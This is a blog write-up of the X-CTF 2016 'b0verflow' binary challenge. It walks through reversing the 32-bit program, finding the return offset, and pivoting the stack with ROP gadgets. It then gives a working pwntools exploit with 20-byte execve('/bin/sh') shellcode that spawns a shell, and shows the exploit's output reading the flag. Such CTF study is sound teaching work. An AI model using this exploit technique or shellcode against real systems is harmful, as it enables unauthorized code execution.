+++
tags = ["stack pivot","rop","ctf","linux"]
categories = ["Capture the Flag"]
date = "2021-08-13"
description = "A writeup for the binary exploitation challenge 'b0verflow' from X-CTF 2016."
featuredpath = "date"
linktitle = ""
title = "X-CTF 2016 :: B0verflow"
slug = "xctf-2016-b0verflow"
type = "post"
+++

## Reverse Engineering

Let's begin by using the `file` command to get a little insight into this executable. Note that it is a 32-bit linux binary.

```
$ file ./b0verflow 
./b0verflow: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=9f2d9dc0c9cc531c9656e6e84359398dd765b684, not stripped
```

We can also use `checksec` to get an overview of what exploit protections it has. Note that there is no stack canary and the NX bit is not set, so it is likely vulnerable to a classic stack overflow. 

```
$ checksec ./b0verflow
[*] './b0verflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Running the binary reveals that it at some point prompts us for user input. This is likely where we'll find a vulnerability (perhaps it reads to much data in).

```
$ ./b0verflow 

======================

Welcome to X-CTF 2016!

======================
What's your name?
anvbis
Hello anvbis
.
```

Disassembling the `main` function reveals that it calls a function `vul`. We'll want to investigate this function next, I get the feeling it's vulnerable.

```
int main (int argc, char **argv, char **envp);
0x0804850e      push    ebp
0x0804850f      mov     ebp, esp
0x08048511      and     esp, 0xfffffff0
0x08048514      call    vul        ; sym.vul
0x08048519      leave
0x0804851a      ret
```

Reversing the `vul` function shows that it reads in 0x32 bytes from stdin, and stores them at a pointer `*s`. However, we can see that no memory (beyond the size of the pointer itself) is allocated on the stack at this address.

```c
undefined4 vul(void)
{
    char *s;
    
    puts("\n======================");
    puts("\nWelcome to X-CTF 2016!");
    puts("\n======================");
    puts("What\'s your name?");
    fflush(_reloc.stdout);
    fgets(&s, 0x32, _reloc.stdin);
    printf("Hello %s.", &s);
    fflush(_reloc.stdout);
    return 1;
}
```

We've found our stack buffer overflow. 


## Information Gathering

Next, let's find where the return address is relative to our input buffer. Note that the `vul` function doesn't read many bytes in (only 0x32) so hopefully this is enough to reach the return address.

Here's a simple script that attaches the process to GDB and sends a cyclic pattern of 100 bytes that we can use to determine the return address' offset.

```py
#!/usr/bin/env python3

from pwn import *

r = process('./b0verflow')
gdb.attach(r)

r.clean()
r.writeline(cyclic(100))

r.interactive()
```

We can continue in GDB and watch the process crash when it tries to return to our garbage data. See the top of the stack below, it seems we can only write about 9 bytes past the return address, this will complicate our exploit.

```
pwndbg> x/4x $esp
0xff93cf20:     0x6161616b      0x6161616c      0x0000006d      0xf7de4e46
```

Let's print out the value of `$eip` and use pwntools' `cyclic_find` function to find the offset. It appears that `$eip` is 36 bytes after the start of our input buffer.

```
pwndbg> p $eip
$1 = (void (*)()) 0x6161616a
```

```py
In [2]: cyclic_find(0x6161616a)
Out[2]: 36
```

So, now we need to solve the limited space issue (9 bytes is not enough space to store a complex ROP chain). Let's use the `ropper` tool to see if we can find any gadgets to pivot our stack.

```
$ ropper --file ./b0verflow --stack-pivot
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x08048609: add esp, 0x1c; pop ebx; pop esi; pop edi; pop ebp; ret; 
0x0804837e: add esp, 8; pop ebx; ret; 
0x0804847e: ret 0xeac1; 
0x08048500: sub esp, 0x24; ret; 

4 gadgets found
```

The gadget that I immediately noticed was `sub esp, 0x24; ret`, this will allow us to move the stack almost all the way to the start of our input buffer (about 4 bytes into our input buffer, to be exact).

```
0x08048500: sub esp, 0x24; ret;
```

Now we just need something like a `jmp esp` or a `mov eax, esp; jmp eax` gadget to direct process execution to our shellcode. Using `ropper` again, we immediately find a `jmp esp` instruction.

```
$ ropper --file ./b0verflow --search 'jmp esp'                                                              130 ⨯
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: jmp esp

[INFO] File: ./b0verflow
0x08048504: jmp esp;
```


## Exploit Development

Now that we have all the information we need, we can start developing our exploit.

Let's write some shellcode. We only have a limited amount of space to store it (about 32 bytes), so I've used various techniques (such as using `xor` to set registers to `0`) to reduce the size of the shellcode. 

```
.global _start

_start:
.intel_syntax noprefix
shell:
    push 0x0068732f     # "/sh"
    push 0x6e69622f     # "/bin"
    mov ebx, esp        # "/bin/sh"
    xor ecx, ecx
    xor edx, edx
    mov al, 11
    int 0x80            # execve("/bin/sh")
```

```
$ gcc -nostdlib -static shellcode.s -o shellcode -m32
$ objcopy --dump-section .text=payload shellcode
```

After compilation, we can see that our shellcode is only 20 bytes long, very nice.

```
08049000 <_start>:
 8049000:       68 2f 73 68 00          push   $0x68732f
 8049005:       68 2f 62 69 6e          push   $0x6e69622f
 804900a:       89 e3                   mov    %esp,%ebx
 804900c:       31 c9                   xor    %ecx,%ecx
 804900e:       31 d2                   xor    %edx,%edx
 8049010:       b0 0b                   mov    $0xb,%al
 8049012:       cd 80                   int    $0x80
```

```py
In [1]: open('payload','rb').read()
Out[1]: b'h/sh\x00h/bin\x89\xe31\xc91\xd2\xb0\x0b\xcd\x80'

In [2]: len(open('payload','rb').read())
Out[2]: 20
```

Now we can write our final exploit. Note that we need to add the address to the `jmp esp` gadget 4 bytes after the start of our input buffer (as this is where the program will attempt to get the next return address after our stack pivot). 

Here's an overview of what we want to achieve:
 - Pivot our stack with the `sub esp, 0x24; ret` gadget.
 - Jump to `$esp`, where our shellcode is stored.
 - Get shellcode execution.

```py
#!/usr/bin/env python3

from pwn import *


'''
0x08048504: jmp esp;
'''
jmp_esp = p32(0x08048504)

'''
0x08048500: sub esp, 0x24; ret;
'''
sub_esp = p32(0x08048500)


buf = b'h/sh\x00h/bin\x89\xe31\xc91\xd2\xb0\x0b\xcd\x80'

lpad = b'A'*4
rpad = b'A'*(36 - len(buf) - len(jmp_esp) - 4)

r = process('./b0verflow')

r.clean()
r.writeline(lpad + jmp_esp + buf + rpad + sub_esp)

r.clean()
r.interactive()
```

And finally, here's our exploit in action.

```
$ ./exploit.py 
[+] Starting local process './b0verflow': pid 2328
[*] Switching to interactive mode
$ cat flag.txt
X-CTF{b0verflow}
$ 
[*] Stopped process './b0verflow' (pid 2328)
```
